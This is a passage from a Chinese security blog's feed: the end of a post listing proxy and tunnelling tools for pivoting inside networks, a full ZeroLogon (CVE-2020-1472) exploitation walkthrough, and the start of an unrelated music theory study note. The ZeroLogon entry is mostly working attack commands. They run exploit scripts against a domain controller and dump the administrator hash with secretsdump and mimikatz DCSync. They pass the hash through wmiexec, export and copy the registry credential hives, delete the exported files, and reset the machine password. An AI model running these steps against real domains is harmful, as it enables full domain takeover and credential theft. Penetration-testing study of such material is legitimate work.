href="https://github.com/vzex/dog-tunnel">https://github.com/vzex/dog-tunnel</a></p><p><a href="https://github.com/EddieIvan01/iox">https://github.com/EddieIvan01/iox</a></p><p><a href="https://github.com/fatedier/frp/">https://github.com/fatedier/frp/</a></p><p><a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p><p><a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p><h1 id="隔离网络之多级代理"><a href="#隔离网络之多级代理" class="headerlink" title="隔离网络之多级代理"></a>隔离网络之多级代理</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><p>内网渗透中，会遇到隔离网络，更多时候是逻辑上的隔离，突破的办法就是拿到route可达的跳板机 (多张网卡、运维机等)的权限，建立一层二级代理、三级代理…</p><blockquote><p><strong>注意：随机应变</strong></p></blockquote><p>常用工具：</p><p><a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p><p><a href="https://github.com/ginuerzh/gost">https://github.com/ginuerzh/gost</a></p><p><a href="https://github.com/Dliv3/Venom">https://github.com/Dliv3/Venom</a></p><p><strong>还有一些windows【netsh】和linux【ssh】的自带程序的端口转发、icmp协议的流量转发没有写，不过一般也用不到，暂时先写这么多。</strong></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;内网传输通道的建立。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>域渗透|ZeroLogon的利用</title>
    <link href="https://www.se7ensec.cn/2021/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F-ZeroLogon%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <id>https://www.se7ensec.cn/2021/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F-ZeroLogon%E7%9A%84%E5%88%A9%E7%94%A8/</id>
    <published>2021-03-12T07:10:24.000Z</published>
    <updated>2021-09-01T15:53:17.245Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>CVE-2020-1472</p></blockquote><a id="more"></a><p><a href="https://www.anquanke.com/post/id/219374">https://www.anquanke.com/post/id/219374</a></p><p>文中提到一种办法，适用于其他办法<code>无法恢复</code>的情况</p><p><strong>脱域后，可以使用powershell来强制同步，一次性重置计算机的机器帐户密码。(包括AD，注册表，lsass里面的密码)。</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">Reset-ComputerMachinePassword</span></span><br></pre></td></tr></table></figure><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">域：AAAA.COM</span><br><span class="line">DC：LX<span class="literal">-DC01</span>.AAAA.COM &lt;<span class="literal">-ip</span>-&gt; <span class="number">192.168</span>.<span class="number">1.4</span></span><br></pre></td></tr></table></figure><h2 id="python版本"><a href="#python版本" class="headerlink" title="python版本"></a>python版本</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p><a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 zerologon_tester.py LX<span class="literal">-DC01</span> <span class="number">192.168</span>.<span class="number">1.4</span> </span><br></pre></td></tr></table></figure><h3 id="安装impacket"><a href="#安装impacket" class="headerlink" title="安装impacket"></a>安装impacket</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/SecureAuthCorp/impacket.git</span><br><span class="line"><span class="built_in">cd</span> impacket &amp;&amp; pip3 install .</span><br></pre></td></tr></table></figure><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p><a href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a> - set_empty_pw.py</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 set_empty_pw.py LX<span class="literal">-DC01</span> <span class="number">192.168</span>.<span class="number">1.4</span> </span><br></pre></td></tr></table></figure><h3 id="获取域管administrator的hash"><a href="#获取域管administrator的hash" class="headerlink" title="获取域管administrator的hash"></a>获取域管administrator的hash</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py AAAA.COM/LX<span class="literal">-DC01</span>\<span class="variable">$</span>@<span class="number">192.168</span>.<span class="number">1.4</span> <span class="literal">-no</span><span class="literal">-pass</span></span><br></pre></td></tr></table></figure><h3 id="通过wmiexec使用-“administrator”的hash获取域管权限"><a href="#通过wmiexec使用-“administrator”的hash获取域管权限" class="headerlink" title="通过wmiexec使用 “administrator”的hash获取域管权限"></a>通过wmiexec使用 “administrator”的hash获取域管权限</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py <span class="literal">-hashes</span> :be833ac3f39c0f843b1b653d37c34dbe AAAA.COM/administrator@<span class="number">192.168</span>.<span class="number">1.4</span> </span><br></pre></td></tr></table></figure><h4 id="获取目标原始hash"><a href="#获取目标原始hash" class="headerlink" title="获取目标原始hash"></a>获取目标原始hash</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br></pre></td></tr></table></figure><h4 id="将导出的hash文件下载到本地"><a href="#将导出的hash文件下载到本地" class="headerlink" title="将导出的hash文件下载到本地"></a>将导出的hash文件下载到本地</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get system.save</span><br><span class="line">get sam.save</span><br><span class="line">get security.save</span><br></pre></td></tr></table></figure><p><strong>坑点：这一步有可能python出现编码错误导致不能下载</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">不同语言的编码不同，可以先获取下语言然后搜对应编码</span><br><span class="line">https:&#x2F;&#x2F;docs.python.org&#x2F;3&#x2F;library&#x2F;codecs.html</span><br><span class="line">指定下编码</span><br><span class="line">python3 wmiexec.py -hashes :be833ac3f39c0f843b1b653d37c34dbe AAAA.COM&#x2F;administrator@192.168.1.4 -codec gb2312</span><br></pre></td></tr></table></figure><p><strong>也可使用net use将文件copy回来</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mimi注入hash到cmd</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:AAAA /ntlm:be833ac3f39c0f843b1b653d37c34dbe</span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">1.4</span></span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192.168</span>.<span class="number">1.4</span>\c<span class="variable">$</span>\system.save c:\system.save</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192.168</span>.<span class="number">1.4</span>\c<span class="variable">$</span>\sam.save c:\sam.save</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192.168</span>.<span class="number">1.4</span>\c<span class="variable">$</span>\security.save c:\security.save</span><br></pre></td></tr></table></figure><h4 id="在域控主机上删除导出的hash文件。"><a href="#在域控主机上删除导出的hash文件。" class="headerlink" title="在域控主机上删除导出的hash文件。"></a>在域控主机上删除导出的hash文件。</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">del</span> /f system.save</span><br><span class="line"><span class="built_in">del</span> /f sam.save</span><br><span class="line"><span class="built_in">del</span> /f security.save</span><br></pre></td></tr></table></figure><h3 id="使用secretsdump读取下载到本地的hash文件-获取域控机器账户置空前的原始hash"><a href="#使用secretsdump读取下载到本地的hash文件-获取域控机器账户置空前的原始hash" class="headerlink" title="使用secretsdump读取下载到本地的hash文件,获取域控机器账户置空前的原始hash"></a>使用secretsdump读取下载到本地的hash文件,获取域控机器账户置空前的原始hash</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py <span class="literal">-sam</span> sam.save <span class="literal">-system</span> system.save <span class="literal">-security</span> security.save LOCAL</span><br></pre></td></tr></table></figure><h3 id="密码恢复"><a href="#密码恢复" class="headerlink" title="密码恢复"></a>密码恢复</h3><p><strong>建议使用：</strong></p><blockquote><p>脚本有可能会缺少xxx包导致报错，还没整明白啥原因</p></blockquote><p><a href="https://github.com/mstxq17/cve-2020-1472">https://github.com/mstxq17/cve-2020-1472</a> - restorepassword.py</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 restorepassword.py aaaa.com/LX<span class="literal">-DC01</span>@LX<span class="literal">-DC01</span> <span class="literal">-target</span><span class="literal">-ip</span> <span class="number">192.168</span>.<span class="number">1.4</span> <span class="literal">-hexpass</span> <span class="number">87</span>e2812ccea41210c80e298c9e2a43a249d6a4056027787774340fbfd4b5f969563803b0f1bae7ccd24b29b41ae611025f1952793562d73e7f4e0f8938b3361332b35dd5ee22785b79b922149db32dc5c9301f4fd9fd090f532575bf5197a9c9230955bfd96ab928ae66b3999730c75b8545e26770816f21f2dbf9dbb19432211a91224c4c618507f7091ae09435a13a04bad5f056e72d34a96f67fa33d50e7596eca7709f398d98ba9e07407d7b2e4b937e40d1bf5ff0eb2240bdf0e8287e26ea5f8e69219fa7b1c5aa0e0bd8b992a176c32b0efb914fa6c1e53d69179110b02dfc1b1a0e53b445b92588420af18960</span><br></pre></td></tr></table></figure><p><del><strong>不建议使用：</strong></del></p><blockquote><p>比较暴力，会再打一次，计算密码的时候使用了空密码的hash去计算session_key</p></blockquote><p><a href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a> - reinstall_original_pw.py</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR ORIG_NT_HASH</span><br></pre></td></tr></table></figure><h2 id="mimikatz版本"><a href="#mimikatz版本" class="headerlink" title="mimikatz版本"></a>mimikatz版本</h2><h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Intel\mimikatz.exe <span class="string">&quot;lsadump::zerologon /target:192.168.1.4 /account:LX-DC01<span class="variable">$</span>&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::zerologon /target:<span class="number">192.168</span>.<span class="number">1.4</span> /account:LX<span class="literal">-DC01</span><span class="variable">$</span></span><br></pre></td></tr></table></figure><h3 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Intel\mimikatz.exe <span class="string">&quot;lsadump::zerologon /target:LX-DC01.AAAA.COM /account:LX-DC01<span class="variable">$</span> /exploit&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::zerologon /target:LX<span class="literal">-DC01</span>.AAAA.COM /account:LX<span class="literal">-DC01</span><span class="variable">$</span> /exploit</span><br></pre></td></tr></table></figure><h3 id="获取域管administrator的hash-1"><a href="#获取域管administrator的hash-1" class="headerlink" title="获取域管administrator的hash"></a>获取域管administrator的hash</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Intel\mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:AAAA.COM /dc:LX-DC01.AAAA.COM /user:administrator /authuser:LX-DC01<span class="variable">$</span> /authdomain:AAAA /authpassword: /authntlm&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:AAAA.COM /dc:LX<span class="literal">-DC01</span>.AAAA.COM /user:administrator /authuser:LX<span class="literal">-DC01</span><span class="variable">$</span> /authdomain:AAAA /authpassword: /authntlm</span><br></pre></td></tr></table></figure><h3 id="hash-注入起一个域管cmd"><a href="#hash-注入起一个域管cmd" class="headerlink" title="hash 注入起一个域管cmd"></a>hash 注入起一个域管cmd</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Intel\mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:administrator /domain:AAAA /ntlm:be833ac3f39c0f843b1b653d37c34dbe&quot;</span> <span class="string">&quot;exit</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:AAAA /ntlm:be833ac3f39c0f843b1b653d37c34dbe</span><br></pre></td></tr></table></figure><h3 id="通过域管cmd，恢复域控机器账户密码"><a href="#通过域管cmd，恢复域控机器账户密码" class="headerlink" title="通过域管cmd，恢复域控机器账户密码"></a>通过域管cmd，恢复域控机器账户密码</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Intel\mimikatz.exe <span class="string">&quot;lsadump::postzerologon /target:192.168.1.4 /account:LX-DC01<span class="variable">$</span>&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::postzerologon /target:<span class="number">192.168</span>.<span class="number">1.4</span> /account:LX<span class="literal">-DC01</span><span class="variable">$</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;CVE-2020-1472&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="域渗透" scheme="https://www.se7ensec.cn/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>乐理基础学习笔记</title>
    <link href="https://www.se7ensec.cn/2021/03/04/%E4%B9%90%E7%90%86%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://www.se7ensec.cn/2021/03/04/%E4%B9%90%E7%90%86%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-03-03T17:16:18.000Z</published>
    <updated>2021-03-12T14:01:35.751Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>乐理基础学习笔记。</p></blockquote><a id="more"></a><h1 id="节奏"><a href="#节奏" class="headerlink" title="节奏"></a>节奏</h1><h2 id="拍"><a href="#拍" class="headerlink" title="拍"></a>拍</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通常底鼓每响一次则为一拍，一拍就是音乐中用来定义音的长度的单位，但是根据曲作者的要求，这个基本单位的时长也是可以变化的。</span><br><span class="line">比如作者规定一分钟60拍，那么一拍就是1秒。</span><br></pre></td></tr></table></figure><h2 id="速度"><a href="#速度" class="headerlink" title="速度"></a>速度</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bpm - beats per minute &#123;每分钟多少拍&#125;</span><br></pre></td></tr></table></figure><h2 id="小节"><a href="#小节" class="headerlink" title="小节"></a>小节</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">于小节的概念你可以这么理解，它就像是你写一个曲子最基本的节奏循环单位。比如圆舞曲，很多都是三拍子的，所以跳起舞来可以有一哒哒，二哒哒，三哒哒，这样的感觉。这就是节奏的意思了。</span><br><span class="line">所以一个小节，就是规定我这个曲子是按怎么样的节奏在演奏着，是哒哒哒，哒哒哒，还是哒哒哒哒，哒哒哒哒。</span><br></pre></td></tr></table></figure><h2 id="节拍"><a href="#节拍" class="headerlink" title="节拍"></a>节拍</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通常音乐大部分为4&#x2F;4拍</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303224319162.png"></p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303224747561.png"></p><h2 id="音符时值"><a href="#音符时值" class="headerlink" title="音符时值"></a>音符时值</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">全音符、二分音符、四分音符（时间长度 &#x3D; 一拍）</span><br></pre></td></tr></table></figure><h1 id="钢琴键盘"><a href="#钢琴键盘" class="headerlink" title="钢琴键盘"></a>钢琴键盘</h1><h2 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303232256798.png"></p><h2 id="升降"><a href="#升降" class="headerlink" title="升降"></a>升降</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303232519187.png"></p><h2 id="中央C-C5"><a href="#中央C-C5" class="headerlink" title="中央C = C5"></a>中央C = C5</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303232704056.png"></p><h1 id="调-diao-是啥"><a href="#调-diao-是啥" class="headerlink" title="调(diào)是啥"></a>调(diào)是啥</h1><h2 id="大调"><a href="#大调" class="headerlink" title="大调"></a>大调</h2><h3 id="C大调"><a href="#C大调" class="headerlink" title="C大调"></a>C大调</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303232914629.png"></p><h3 id="D大调"><a href="#D大调" class="headerlink" title="D大调"></a>D大调</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303232953859.png"></p><h3 id="…"><a href="#…" class="headerlink" title="…"></a>…</h3><h2 id="升、降号调"><a href="#升、降号调" class="headerlink" title="升、降号调"></a>升、降号调</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303233103609.png"></p><h2 id="稳定音"><a href="#稳定音" class="headerlink" title="稳定音"></a>稳定音</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303233249966.png"></p><h2 id="音的倾向性"><a href="#音的倾向性" class="headerlink" title="音的倾向性"></a>音的倾向性</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303233423520.png"></p><h1 id="音程"><a href="#音程" class="headerlink" title="音程"></a>音程</h1><h2 id="半音"><a href="#半音" class="headerlink" title="半音"></a>半音</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从0开始数</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303234010598.png"></p><h2 id="度数"><a href="#度数" class="headerlink" title="度数"></a>度数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">从1开始数</span><br><span class="line">度数 &#x3D; 白键数 ， 大小度为区分同度数内的半音数多少</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303234253799.png"></p><h2 id="转位三要素"><a href="#转位三要素" class="headerlink" title="转位三要素"></a>转位三要素</h2><h3 id="度数相加等于九"><a href="#度数相加等于九" class="headerlink" title="度数相加等于九"></a>度数相加等于九</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303235952831.png"></p><h3 id="大小、增减是互换"><a href="#大小、增减是互换" class="headerlink" title="大小、增减是互换"></a>大小、增减是互换</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303235514205.png"></p><h3 id="纯音程不变"><a href="#纯音程不变" class="headerlink" title="纯音程不变"></a>纯音程不变</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303235848223.png"></p><h2 id="协和音程"><a href="#协和音程" class="headerlink" title="协和音程"></a>协和音程</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304000124238.png"></p><h1 id="和弦"><a href="#和弦" class="headerlink" title="和弦"></a>和弦</h1><h2 id="三和弦"><a href="#三和弦" class="headerlink" title="三和弦"></a>三和弦</h2><p>三度叠置</p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304000952158.png"></p><h3 id="大三和弦"><a href="#大三和弦" class="headerlink" title="大三和弦"></a>大三和弦</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304000434518.png"></p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304000525111.png"></p><h3 id="小三和弦"><a href="#小三和弦" class="headerlink" title="小三和弦"></a>小三和弦</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304000554989.png"></p><h3 id="减三和弦"><a href="#减三和弦" class="headerlink" title="减三和弦"></a>减三和弦</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304000752501.png"></p><h3 id="三和弦转位"><a href="#三和弦转位" class="headerlink" title="三和弦转位"></a>三和弦转位</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304001114764.png"></p><h2 id="七和弦"><a href="#七和弦" class="headerlink" title="七和弦"></a>七和弦</h2><h3 id="大七和弦"><a href="#大七和弦" class="headerlink" title="大七和弦"></a>大七和弦</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">大三和弦+大七度</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304001234499.png"></p><h3 id="小七和弦"><a href="#小七和弦" class="headerlink" title="小七和弦"></a>小七和弦</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小三和弦+小七度</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304001315440.png"></p><h3 id="属七和弦"><a href="#属七和弦" class="headerlink" title="属七和弦"></a>属七和弦</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">大三和弦+小七度</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304001600305.png"></p><h3 id="小大七和弦"><a href="#小大七和弦" class="headerlink" title="小大七和弦"></a>小大七和弦</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小三和弦+大七度</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304001624745.png"></p><h3 id="七和弦转位"><a href="#七和弦转位" class="headerlink" title="七和弦转位"></a>七和弦转位</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304001751774.png"></p><h1 id="五度循环圈"><a href="#五度循环圈" class="headerlink" title="五度循环圈"></a>五度循环圈</h1><h2 id="五度循环圈-1"><a href="#五度循环圈-1" class="headerlink" title="五度循环圈"></a>五度循环圈</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">和声连接、调的关系、深入理解音程、即兴演奏</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304002503404.png"></p><h1 id="调式中各音级的名称"><a href="#调式中各音级的名称" class="headerlink" title="调式中各音级的名称"></a>调式中各音级的名称</h1><h2 id="调式中各音级的名称-1"><a href="#调式中各音级的名称-1" class="headerlink" title="调式中各音级的名称"></a>调式中各音级的名称</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304002700025.png"></p><h1 id="自然小调"><a href="#自然小调" class="headerlink" title="自然小调"></a>自然小调</h1><p>大调欢快，小调悲伤</p><h2 id="自然小调-1"><a href="#自然小调-1" class="headerlink" title="自然小调"></a>自然小调</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304003001471.png"></p><h3 id="例：a小调"><a href="#例：a小调" class="headerlink" title="例：a小调"></a>例：a小调</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304003049655.png"></p><h1 id="关系大小调"><a href="#关系大小调" class="headerlink" title="关系大小调"></a>关系大小调</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C大调是a小调的关系大调，a小调是C大调关系小调。</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304003230348.png"></p><h2 id="关系图"><a href="#关系图" class="headerlink" title="关系图"></a>关系图</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304003422436.png"></p><h1 id="音程度数"><a href="#音程度数" class="headerlink" title="音程度数"></a>音程度数</h1><h2 id="音程度数判断"><a href="#音程度数判断" class="headerlink" title="音程度数判断"></a>音程度数判断</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304003638090.png"></p><h2 id="写和弦构成音"><a href="#写和弦构成音" class="headerlink" title="写和弦构成音"></a>写和弦构成音</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304003908677.png"></p><h2 id="写音阶构成因"><a href="#写音阶构成因" class="headerlink" title="写音阶构成因"></a>写音阶构成因</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304004037120.png"></p><h1 id="自然音程与变化音程"><a href="#自然音程与变化音程" class="headerlink" title="自然音程与变化音程"></a>自然音程与变化音程</h1><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304005010593.png"></p><h2 id="自然音程"><a href="#自然音程" class="headerlink" title="自然音程"></a>自然音程</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304004207142.png"></p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304004410491.png"></p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304004316257.png"></p><h2 id="变化音程"><a href="#变化音程" class="headerlink" title="变化音程"></a>变化音程</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304004502910.png"></p><h3 id="增音程"><a href="#增音程" class="headerlink" title="增音程"></a>增音程</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304004629563.png"></p><h3 id="减音程"><a href="#减音程" class="headerlink" title="减音程"></a>减音程</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304004658655.png"></p><h3 id="倍增音程"><a href="#倍增音程" class="headerlink" title="倍增音程"></a>倍增音程</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304004809942.png"></p><h3 id="倍减音程"><a href="#倍减音程" class="headerlink" title="倍减音程"></a>倍减音程</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304004840148.png"></p><h1 id="小调的变体"><a href="#小调的变体" class="headerlink" title="小调的变体"></a>小调的变体</h1><h2 id="和声小调、旋律小调"><a href="#和声小调、旋律小调" class="headerlink" title="和声小调、旋律小调"></a>和声小调、旋律小调</h2><p><img 